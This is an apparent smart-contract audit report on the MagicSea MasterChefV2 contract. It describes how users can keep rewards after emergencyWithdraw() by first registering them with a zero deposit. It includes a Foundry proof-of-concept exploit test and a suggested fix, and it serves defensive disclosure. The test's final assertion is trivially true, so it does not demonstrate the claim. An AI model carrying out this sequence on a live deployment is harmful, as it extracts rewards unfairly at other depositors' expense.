Soaring Burlap Poodle

Medium

# MasterChefV2.sol :: Users are able to claim their rewards even when using emergencyWithdraw(), which breaks core functionality of the function.

## Summary
**`emergencyWithdraw()`** is designed to allow users to withdraw their tokens without claiming any rewards. However, if **`_mintLUM `** is set to false, users can still claim their rewards using this function, which breacks its primary purpose.
## Vulnerability Detail
**`emergencyWithdraw()`**  is used to allow users to withdraw their tokens without claiming any rewards.
```Solidity
/**
* @dev Emergency withdraws tokens from a farm, without claiming any rewards.
* @param pid The pool ID of the farm.
*/
function emergencyWithdraw(uint256 pid) external override {
        Farm storage farm = _farms[pid];

        uint256 balance = farm.amounts.getAmountOf(msg.sender);
        int256 deltaAmount = -balance.toInt256();

        farm.amounts.update(msg.sender, deltaAmount);

        farm.token.safeTransfer(msg.sender, balance);

        emit PositionModified(pid, msg.sender, deltaAmount, 0);
    }
```
As described in the function, users who utilize this function forfeit their rewards.

**`deposit()`** calls **`_modify()`** to update an account's position on a farm and transfers the funds from the user to the contract.
```Solidity
function deposit(uint256 pid, uint256 amount) external override {
        _modify(pid, msg.sender, amount.toInt256(), false);

        if (amount > 0) _farms[pid].token.safeTransferFrom(msg.sender, address(this), amount);
    }
```
```Solidity
function _modify(uint256 pid, address account, int256 deltaAmount, bool isPayOutReward) private {
        Farm storage farm = _farms[pid];
        Rewarder.Parameter storage rewarder = farm.rewarder;
        IMasterChefRewarder extraRewarder = farm.extraRewarder;

        (uint256 oldBalance, uint256 newBalance, uint256 oldTotalSupply,) = farm.amounts.update(account, deltaAmount);

        uint256 totalLumRewardForPid = _getRewardForPid(rewarder, pid, oldTotalSupply);
   
        uint256 lumRewardForPid = _mintLum(totalLumRewardForPid);

        uint256 lumReward = rewarder.update(account, oldBalance, newBalance, oldTotalSupply, lumRewardForPid);

@>      if (isPayOutReward) {
            lumReward = lumReward + unclaimedRewards[pid][account];
            unclaimedRewards[pid][account] = 0;
            if (lumReward > 0) _lum.safeTransfer(account, lumReward);
        } else {
            unclaimedRewards[pid][account] += lumReward;
        }

        if (address(extraRewarder) != address(0)) {
            extraRewarder.onModify(account, pid, oldBalance, newBalance, oldTotalSupply);
        }

        emit PositionModified(pid, account, deltaAmount, lumReward);
    }
```
As you can see, if **`isPayOutReward`** is true, the rewards are sent to the user; if false, they are registered in the **`unclaimedRewards`** mapping.
The issue arises when **`_mintLUM`** is set to false. This parameter indicates whether the contract should mint lumTokens. If set to false, the contract must be funded with lumTokens to pay the rewards to the users and the treasury.
```Solidity
function _mintLum(uint256 amount) private returns (uint256) {
        if (amount == 0) return 0;

        (uint256 treasuryAmount, uint256 liquidityMiningAmount) = _calculateAmounts(amount);

@>      if (!_mintLUM) {
            _lum.safeTransfer(_treasury, treasuryAmount);
            return liquidityMiningAmount;
        }

        _lum.mint(_treasury, treasuryAmount);
        return _lum.mint(address(this), liquidityMiningAmount);
    }
```
The problem is that a user can claim rewards even when using **`emergencyWithdraw()`** if **`_mintLUM`** is false. Here's an example illustrating how this can happen:
1. The user deposits some tokens using **`deposit()`**.
1. After some time passes, the user deposits an amount of 0 using **`deposit()`**, registering their rewards in the **`unclaimedRewards[pid][account]`** mapping.
1. The user calls **`emergencyWithdraw()`** to recover their tokens.
1. The user calls **`claim()`** to obtain their rewards. This is possible because, in step 2, the user's rewards were saved in the mapping.

This exploit allows a user to take advantage of others. Imagine a scenario where the contract doesn't have enough funds to pay the rewards (remember, **`_mintLUM`** is false and the contract needs to be funded to pay the rewards). A user notices this and, to avoid risk, performs the previous actions to recover their funds without risk while saving their rewards for later.

This strategy allows the user to minimize risk by withdrawing their funds while still having the option to claim rewards later. This creates an unfair advantage over other users who leave their funds in the pool, trusting the system and accepting the risk. The user exploiting this strategy faces no risk, putting other users at a disadvantage.

Additionally, this issue undermines the functionality of **`emergencyWithdraw()`**. The intended purpose of **`emergencyWithdraw()`** is to allow users to withdraw their funds without claiming rewards. However, users can still claim their rewards, defeating the core purpose of the function.
## Impact
The logic of **`emergencyWithdraw()`** is completely broken.
Users can exploit this by claiming their rewards without any risk, thereby taking advantage over other users.
## POC
To set up the following POC, create a file named **`MasterChefV2.t.sol`** inside the test folder and paste the provided code. Additionally, adjust **`VoterMock.t.sol`** to ensure that the getWeight() function returns 100 to prevent transaction to revert.
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import "../src/transparent/TransparentUpgradeableProxy2Step.sol";

import "openzeppelin/token/ERC721/ERC721.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "openzeppelin/token/ERC20/IERC20.sol";
import {LumMock} from "../src/mocks/LumMock.sol";
import {MasterChef} from "../src/MasterChefV2.sol";
import {MlumStaking} from "../src/MlumStaking.sol";
import "../src/Voter.sol";
import {IVoter} from "../src/interfaces/IVoter.sol";
import {VoterMock} from "./mocks/VoterMock.sol";
import {ILum} from "../src/interfaces/ILum.sol";
import {IRewarderFactory} from "../src/interfaces/IRewarderFactory.sol";
import {IMasterChefRewarder} from "../src/interfaces/IMasterChefRewarder.sol";
import {ERC20Mock} from "./mocks/ERC20.sol";


contract MasterChefV2Test is Test {

    address payable immutable DEV = payable(makeAddr("dev"));
    address payable immutable ALICE = payable(makeAddr("alice"));
    address payable immutable BOB = payable(makeAddr("bob"));
    
    address private owner;
    address private treasury;
    ILum private lumToken;
    IVoter private voter;
    IRewarderFactory private rewarderFactory;
    address private lbHooksManager;
    uint256 private treasuryShare = 0.5e18; 
    ERC20Mock private _stakingToken;
    MasterChef private masterChef;

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    function setUp() public {
        owner = address(this);
        treasury = address(0x123);

        // Mock LUM token, Voter, RewarderFactory, and lbHooksManager
        lumToken = ILum(new LumMock(DEV, DEV));
        voter = IVoter(address(new VoterMock()));
        rewarderFactory = IRewarderFactory(address(123));
        lbHooksManager = address(0x456);
        
        vm.prank(DEV);
        address masterChefimplementation = address(new MasterChef(lumToken, voter, rewarderFactory, lbHooksManager, treasuryShare));

        masterChef = MasterChef(
            address(
                new TransparentUpgradeableProxy2Step(
                    masterChefimplementation, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(MasterChef.initialize.selector, DEV, address(555))
                )
            )
        );

        _stakingToken = new ERC20Mock("MagicLum", "MLUM", 18);

        vm.prank(DEV);
        lumToken.grantRole(MINTER_ROLE, address(masterChef));

        vm.prank(address(masterChef));
        lumToken.mint(DEV, 100_000e18);

        //add a pid
        vm.prank(lbHooksManager);
        masterChef.add(IERC20(_stakingToken), IMasterChefRewarder(address(0)));

        vm.prank(DEV);
        masterChef.setLumPerSecond(5e18);

        vm.prank(DEV);
        masterChef.setVoter(voter);

        vm.prank(DEV);
        masterChef.setMintLum(true);

        _stakingToken.mint(address(this), 100_000e18);
        _stakingToken.mint(ALICE, 100_000e18);
        _stakingToken.mint(DEV, 100_000e18);
    }
function testEmergencyWithdraw() public {
        
        vm.prank(DEV);
        masterChef.setMintLum(false);
        vm.prank(DEV);
        lumToken.transfer(address(masterChef), 1000e18);

        _stakingToken.approve(address(masterChef), 100_000e18);

        //user deposit some tokens
        masterChef.deposit(0, 1000e18);
        
        assertEq(lumToken.balanceOf(address(this)), 0);

        uint256[] memory pid = new uint256[](1);
        pid[0] = 0;

        vm.warp(block.timestamp + 100);
        
        //deposit 0 value to register their rewards in the mapping
        masterChef.deposit(0, 0);

        //call to recover the tokens
        masterChef.emergencyWithdraw(0);
        
        vm.warp(block.timestamp + 100);
        //some time passes and user claim their rewards
        masterChef.claim(pid);

        console.log("Final Balance:", lumToken.balanceOf(address(this)));
        assertGe(lumToken.balanceOf(address(this)), 0);

    }
}
```
## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L326-L337
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L539-L564
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L295-L299
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L316-L320
## Tool used
Manual Review.
## Recommendation
Ensure that **`emergencyWithdraw()`** resets **`unclaimedRewards[pid][account]`** to 0.
```diff
function emergencyWithdraw(uint256 pid) external override {
        Farm storage farm = _farms[pid];

        uint256 balance = farm.amounts.getAmountOf(msg.sender);
        int256 deltaAmount = -balance.toInt256();

        farm.amounts.update(msg.sender, deltaAmount);

        farm.token.safeTransfer(msg.sender, balance);

+       unclaimedRewards[pid][msg.sender] = 0 

        emit PositionModified(pid, msg.sender, deltaAmount, 0);
    }
```
